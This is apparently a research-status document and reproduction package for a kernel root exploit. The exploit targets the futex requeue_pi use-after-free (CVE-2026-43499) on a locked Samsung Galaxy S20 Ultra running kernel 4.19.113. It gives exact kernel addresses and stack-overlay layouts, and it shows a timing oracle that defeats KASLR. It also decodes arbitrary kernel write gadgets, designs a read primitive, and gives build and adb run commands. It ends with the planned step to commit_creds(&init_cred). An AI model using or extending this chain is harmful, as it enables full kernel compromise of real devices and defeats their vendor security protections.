# Open problem: the last mile to GhostLock (CVE-2026-43499) on Samsung z3q

Target: **Samsung Galaxy S20 Ultra SM-G988U (z3q), G988USQSDHYG2, kernel
4.19.113-27095354, One UI 5 / Android 13**, bootloader locked (US model,
no OEM unlock), Knox secapp-seeded KASLR, no dmesg/kallsyms/pstore for
shell. Everything below is derived from the shipped vmlinux and verified
on the device unless marked otherwise. This document is the full data
package for anyone picking up the problem.

**If you know this device: this is the same machine as
Root-My-Galaxy issue #743. Nobody has published a 4.19 Samsung root
chain.**

## Status

| Piece | State |
|---|---|
| Trigger (futex requeue_pi UAF) | fires on device (races observed since run 1) |
| Address-space truth | **solved**: VA39 build, table below |
| Per-boot KASLR slide | **solved, per-boot random**: first-touch single-shot oracle (old best-of-4 oracle was a mapped-ness oracle — see Q1) |
| Write primitive | decoded: two arbitrary-target constrained-value qword writes per rb erase pass |
| Gadget targets | RELA-verified twice: `random_table` entry[8] ("boot_id") .data slot, `&loggers[0][0]` |
| Overlay (stack stamp) | pselect route **impossible** on this build; setsockopt-MCAST route geometry **derived, full waiter coverage** |
| Readback channel | **proven in principle**: landed W1 changes what boot_id serves; P must point at nonzero-byte-8 memory for an actual leak |
| Erase trigger (Q1) | **CLOSED 2026-11-05 20:24, end-to-end on device** (see Q1) |
| Remaining blocker | Q2: re-aim P for a real 16-byte leak; harden the first-touch oracle (threshold validation across boots) |

## The address-space truth (solved 2026-11-05)

The kernel is a **VA39** build. Every earlier panic (runs 1-9) traces to
a wrong VA48 PAGE_OFFSET assumption.

```
PAGE_OFFSET (linear map) = 0xffffffc000000000
vmalloc / kernel image   = [0xffffff8000000000, 0xffffffc000000000)
kernel image links at      0xffffff8008080000  (KIMAGE_TEXT_BASE)
vmemmap                    0xffffffbf00000000  (= PAGE_OFFSET - 4GB)
```

Verified with `tools/prefetch_probe.c`: an EL0 `prfm` data-prefetch TLB
timing oracle (no KPTI on Cortex-A77, so kernel mappings live in every
user process's TTBR1 tables). Mapped pages time ~5 for a 64-PRFM burst,
walk-fail ~14-22. Caveats: `.text` pages are invisible to a data prefetch
(I-only, DTLB-cold), and the image link base is 0x80000 into its 2MB
block, so slide hypotheses must be probed as `link + off + s*2MB`.

The slide oracle (integrated in `src/slide.c`): probe
`sys_call_table` page (`_text+0x1980000`) and `jiffies` page
(`_text+0x2b87000`) per hypothesis; the lowest dual-confirmed hypothesis
is the true slide (image text is D-cold, so the first mapped non-text
page above the probe floor is exactly the sct page of the true slide).
Works every boot tested, ~2s.

The memstart draw (per-boot linear-map shift) was bounded to a 2-3 GB
band by hot-heap clustering in one boot; exact readout still needs a
read primitive.

## The stack geometry (disasm-derived from the shipped vmlinux)

Waiter side (the UAF'd `rt_mutex_waiter`, inlined into do_futex):

```
__arm64_sys_futex  frame 0x70
do_futex           frame 0x1e0, rt_waiter local at +0xc0
=> rt_waiter at SP0-0x190
   fields: tree_entry @+0x00, pi_tree_entry @+0x18 (both rb_node),
           task @+0x30, lock @+0x38, prio @+0x40, deadline @+0x48
```

Overlay lanes audited (target: controlled qwords covering
[SP0-0x190, SP0-0x148]):

| Lane | Controlled buffer | Verdict |
|---|---|---|
| pselect6 | fd_sets @SP0-0x210, 15 user words | window ends 8 bytes ABOVE tree_entry — **impossible** (SELECT_STACK_ALLOC caps words; larger nfds goes to heap) |
| select | fd_sets @SP0-0x1f0 | window ends 0x28 above tree_entry — insufficient |
| process_vm rw | iov arrays @waiter+0xb8 / waiter+0x38 | neither covers tree_entry |
| writev | iovstack @SP0-0x150+off | too shallow |
| sendmmsg | ___sys_sendmsg frame @SP0-0x380 | too deep |
| **setsockopt IPPROTO_IP MCAST_JOIN_SOURCE_GROUP** | **group_source_req @SP0-0x230 (sp+0x20 in do_ip_setsockopt), 264B copy** | **waiter = gsr+0xa0: ALL fields inside the controlled copy** |

The winning chain:
`sys_setsockopt 0x50 + springboard 0x10 + sock_common_setsockopt 0x10 +
springboard 0x10 + udp_setsockopt 0x10 + ip_setsockopt 0x30 +
do_ip_setsockopt 0x190 = SP0-0x250; gsr copy at sp+0x20`.
The gsr's `sockaddr_storage` padding is fully attacker-controlled; the
family/port validation runs AFTER the copy, so its EINVAL return is
irrelevant to the stamp. The equivalent IPPROTO_IPV6 DGRAM path lands the
gsr 0x10 lower and only covers `tree_entry.rb_parent_color` — use the
IP-level op on an AF_INET socket.

Waiter field placement inside the 264-byte optval buffer
(see `slide_stamp_prepare()` in `src/slide.c`):

```
gsr+0xa0 = tree_entry.rb_parent_color  (P: W1 value)
gsr+0xa8 = tree_entry.rb_right         (0: simple-path erase)
gsr+0xb0 = tree_entry.rb_left          (C: W1 target)
gsr+0xb8 = pi_tree_entry.rb_parent_color
gsr+0xc0 = pi_tree_entry.rb_right
gsr+0xc8 = pi_tree_entry.rb_left
gsr+0xd0 = waiter->task
gsr+0xd8 = waiter->lock
gsr+0xe0 = waiter->prio
gsr+0xe8 = waiter->deadline
```

**Correction 2026-11-05 (disasm-verified against the shipped vmlinux):**
the waiter offset inside the gsr is **0xa0**, not 0x40. Both copy sites
are confirmed in `out/vmlinux`: the gsr copy is
`add x0, sp, #0x20; mov w2, #0x108; bl __arch_copy_from_user` in
do_ip_setsockopt (sp = SP0-0x250), and the inlined rt_waiter is
`add x28, sp, #0xc0` in do_futex (sp = SP0-0x250) — so
`waiter - gsr = (SP0-0x190) - (SP0-0x230) = 0xa0`. The earlier 0x40
table planted every qword 0x60 above the waiter and stamped nothing:
the erase consumer would have read the stale real fields and panicked
(see the Q1 resolution below).

## The write primitive (decoded, upstream GhostLock)

The `____rb_erase` simple path (rb_right == NULL, rb_left != NULL) gives
per rb entry:

```
W1: *(u64*)C = P     (rb_set_parent_color)
W2: *(u64*)(P+8) = C (__rb_change_child else-branch)
```

Both tree_entry and pi_tree_entry are erased, so the pair fires twice.
Values are constrained to kernel VAs (W1's value P must be readable and
P+8 writable; W2's value C must be a writable VA since W1 writes at C
first). The boot_id gadget: `C = &random_table[boot_id].data`,
`P = &loggers[0][0]` — reading `/proc/sys/kernel/random/boot_id` then
serves 16 bytes of kernel memory (both are image VAs + slide).

Both-children path additionally gives a kernel-read exfiltrate +
free-object planting choreography (see PORTING.md §6.5).

## The remaining open problems

**Q1 — CLOSED 2026-11-05 20:24 (run 36): end-to-end confirmed on device.**
With the first-touch oracle reporting slide 0x200000 and GHOSTLOCK_K=0,
the single virgin fire's W1 landed in the REAL
`random_table["boot_id"].data` slot: a separate shell's
`cat /proc/sys/kernel/random/boot_id` after the fire returned a UUID
different from the pre-run stock, stable across reads (one-time
regeneration — see the readback caveat below). Full chain proven:
dangle (EDEADLK + timeout) → waiter-thread MCAST stamp (gsr+0xa0
geometry) → sched_setattr PI walk → planted tree_entry erase →
W1 `*C = P` into the boot_id slot. The slide is per-boot variable
(0x400000 on the 20:11 boot, 0x200000 on the 20:19 boot) — the Knox
"fixed slide" premise is wrong, and every cross-boot k-sweep exclusion
from the evening runs is void; the oracle must (and now does, modulo
its own per-boot verification) resolve the slide in the same boot it
fires.

**Readback caveat for Q2:** the observed change was a one-time
regeneration, not a leak: the planted P (&loggers[0][0]) has a zero
byte at P+8 at runtime (nf_log logger slots empty), so proc_do_uuid's
`if (!uuid[8])` regenerated a fresh UUID into the .bss buffer instead
of serving the 16 bytes at P. The slot-write primitive is proven.

**Q2 read primitive — designed, coded, not yet device-verified:** the
working P choice is `SLIDE_READ_PAIR_OFF` (link 0xffffff800accd988) =
the qword pair below random_table entry[8].data: entry[7]'s
proc_handler (proc_dostring, an image pointer) at P+0 and entry[8]'s
procname (the "boot_id" .rodata string pointer) at P+8. W1 aims the
boot_id slot at this pair; the readback then hex-decodes to two kernel
VAs and `slide = q0 - proc_dostring_link` — a direct slide leak that
also cross-validates the oracle. W2's `*(P+8) = C` lands on
entry[8].procname (harmless after sysctl registration), P+8 is writable
.data, and byte 8 (the string pointer's LSB) is nonzero so
proc_do_uuid serves the pair. Two P candidates already rejected on
device: &loggers[0][0] (zero byte 8 → regeneration, run 36) and
linux_banner (P+8 is read-only .rodata → W2 faults and panics, run 37).
The read-pair build's first two runs (38-39) died before the stamp
phase logged, and the device then entered a spontaneous ~8-minute
reboot cycle (unrelated to any single fire — likely a watchdog/thermal
reaction to the evening's 30+ panic/reboot cycles). Next session:
let the device settle, re-run the read-pair build, and read
`cat /proc/sys/kernel/random/boot_id` from a separate shell after the
fire — it should show two image pointers in UUID-hex form.

Methodology constraints that the confirmed run obeyed (all
device-derived, keep them):

1. **One fire per boot.** The walk's pi-tree erase consumes the planted
   links, then its re-enqueue re-links the waiter into the REAL task's
   pi_waiters tree with those fake links — the tree is left corrupted,
   so every sched_setattr fire after the first walks on garbage. All
   multi-fire results (runs 19-27 fire-2+) are void. The consumer fires
   exactly once per boot (`slide.c` single-fire loop, hypothesis k from
   the `GHOSTLOCK_K` env var — no rebuilds to iterate).
2. **Stamp freeze during the fire** (`slide_stamp_hold`): the planted
   waiter fields are resident (the waiter parks in pause() above the
   region), so the walk reads one consistent field set instead of
   racing the 264-byte re-copy.
3. **waiter->task and waiter->lock must be pinned to a zeroed .bss VA
   (mirror page + 8 / the mirror itself), not swept with the
   hypothesis**: a garbage .data "task" hangs ttwu on its pi_lock (run
   28) and a swept mirror walks off the image tail into module space
   (runs 25/26 panics). A zeroed page makes wake_up_process fast-return
   (state==TASK_RUNNING) and trylock succeed.
4. **Readback before any other post-fire syscall**: the gadget writes
   can corrupt a live .data structure that kills the firing process on
   its next syscall (runs 34-35 died between fire and log). Pre-open
   the boot_id fd, fire, read, and only then write logs — and because a
   landed W1 persists for the whole boot, a separate shell's
   `cat /proc/sys/kernel/random/boot_id` is the authoritative check
   even if the child dies.
5. **The erase is deterministic** (run 23's poison-parent experiment:
   an unmapped P panicked exactly at rb_erase's `__rb_change_child`
   parent read) and every walk-entry guard was disassembled open
   (`max_lock_depth`=1024 passes; [3] next_lock==lock holds — the
   stamp replants the same constant). If a fire is clean but the
   readback is unchanged, the SLIDE was wrong, not the timing.

**Boot_id target re-verified offline:** nm puts `random_table` at link
0xffffff800accd890; decoding the table's .rela.dyn entries against
their .rodata procname strings proves entry[8] is "boot_id" and its
.data slot is EXACTLY link 0xffffff800accd998 (RELA addend
0xffffff800b2eacec = the .bss uuid buffer) — the target.h constant is
correct.

**Oracle evolution (why the evening cross-boot k-sweep was void):** the
original best-of-4 retry timing self-installed TLB entries (the first
burst's speculative walk caches the translation; retries measure the
install), so the "lowest hot trio" rule was really a *mapped-ness*
oracle, and the vmalloc region below the image is heavily mapped (79-207
"hot" hypotheses on an idle boot, no 33-slot contiguous run). Its
steady 0x200000 answer was a vmalloc artifact, and the jiffies anchor
was additionally wrong (probed +0x2b87000; the real jiffies page is
+0x2c07000, 0x80180 away). The rewritten first-touch oracle (one
64-PRFM burst, no retries, mutually disjoint anchor grids so each page
is touched exactly once) cannot false-accept (a walk costs >= 14 ticks)
and reported 0x400000 on one boot and 0x200000 on the next — the slide
is per-boot random, the Knox "fixed slide" premise is wrong, and the
20:19 boot's 0x200000 answer was confirmed correct by the landed W1.
The oracle answer must be trusted per-boot: log the trio tick counts
(the build now logs t_vec/t_sct/t_jif) and treat near-threshold trios
(8/9) with suspicion; remaining hardening: verify the threshold against
logged counts across several boots.

The erase consumer is **neither requeue cleanup, nor
rt_mutex_finish_proxy_lock, nor exit teardown**: it is the PI-adjust
walk that fires when a task's priority changes — i.e. the consumer
thread's `sched_setattr` on the waiter TID.

The dangling state, from kernel/futex.c + kernel/locking/rtmutex.c of
this exact 4.19.113 tree:

1. The requeue's `rt_mutex_start_proxy_lock` calls
   `task_blocks_on_rt_mutex`, which fully enqueues the rt_waiter in the
   target lock's waiters tree and in the owner's pi_waiters, and sets
   `waiter_task->pi_blocked_on = waiter`. The subsequent chain walk hits
   the pi cycle (waiter holds f_pi_chain; owner holds f_pi_target and is
   blocked on f_pi_chain) and returns -EDEADLK.
2. `rt_mutex_start_proxy_lock` then calls `remove_waiter()` — which
   dequeues the rb nodes but clears **`current->pi_blocked_on`**.
   `current` is the requeue caller, not the waiter task (the upstream
   proxy-lock path bug, CVE-2026-43499 itself). The waiter task's
   `pi_blocked_on` still points at its stack rt_waiter.
3. The waiter's own timeout path (`handle_early_requeue_pi_wakeup`)
   never touches pi_blocked_on (it early-returns before the proxy-lock
   cleanup). The task returns to userspace with `pi_blocked_on` pointing
   at the stack rt_waiter: the dangling state, deterministic per race.

The consumer: `sched_setattr(waiter_tid)` with a new nice value →
`__sched_setscheduler(pi=true)` → `rt_mutex_adjust_pi` (prio changed →
proceeds; the planted prio 130 must differ from the new task prio 121)
→ `rt_mutex_adjust_prio_chain` step [7] `rt_mutex_dequeue(lock =
waiter->lock = the planted all-zero mirror)` →
`rb_erase_cached` on the stamped tree_entry → **W1/W2 land**. The walk
then re-enqueues the waiter into the mirror's tree and exits at step [9]
(the mirror has no owner) after `wake_up_process(waiter->task = a
zeroed .bss VA)` — state==TASK_RUNNING so ttwu returns immediately
(pinning the task field to a garbage .data pointer instead HANGS ttwu
on its pi_lock, run 28).

The step that killed runs #6-10: after the erase, step [11] runs
`rt_mutex_dequeue_pi(owner, prerequeue_top_waiter)` where
`prerequeue_top_waiter` is NULL whenever the walk's lock had no waiters
— with the stale real target lock (any flow whose stamp cannot plant
`waiter->lock`, i.e. the pselect route), that is a read at address
0x18: instant panic under PANIC_ON_OOPS, **immediately after the gadget
writes landed**. That is the run-#10 "panicked during the stamp phase"
signature — not a do_exit overwrite race. The MCAST stamp's
`lock = mirror` (zeroed, ownerless) + `task = init_task` plants are
what make the walk exit cleanly at [9]; they are load-bearing, not
cosmetic.

**Q2 — the readback beyond boot_id.** memstart_addr and kimage_voffset
are `__ro_after_init` (readable but W2 would write them), so the boot_id
channel can only serve memory adjacent to writable kernel VAs. Once the
write primitive is confirmed end-to-end, the follow-on chain (fops swap
via the configfs_buffer offsets in PORTING.md §6, then
`commit_creds(&init_cred)` on the RKP whitelist) is already documented.

## Reproduction package

- vmlinux: extracted from AP_G988USQSDHYG2 boot.img, unstripped,
  RELA-relocated `.data` pointers (launch-time fill — file bytes are 0).
- All constants: `src/targets/z3q-4.19.113/target.h` (geometry),
  `tools/extract_symbols.sh` (offsets), `tools/derive_slide_gadgets.py`
  (RELA gadget derivation), `tools/prefetch_probe.c` (oracle, three modes).
- Build: `make PROJECT=z3q-4.19.113 NDK_ROOT=... NDK_TOOLCHAIN=...`
  (aarch64-linux-android33-clang).
- Run: `adb shell 'cd /data/local/tmp && GHOSTLOCK_K=<slide hypothesis in
  2MB units relative to the oracle> LD_PRELOAD=/data/local/tmp/preload.so
  id'` — the exlog mirror writes `log_*.txt` with fsync before every risky
  step. One sched_setattr fire per boot (see Q1); sweep the hypothesis by
  relaunching with different GHOSTLOCK_K values across reboots.

## Non-goals / scope notes

- The three other lab devices (Pixel 3a, Tab A7 Lite, Mi 8 SE) are
  already rooted and out of scope here.
- The kernel source tree (kernel-z3q) does NOT match the shipped binary
  in `arch/arm64/include/asm/memory.h` or `kaslr.c`; the binary-derived
  constants in this document supersede any source reading.
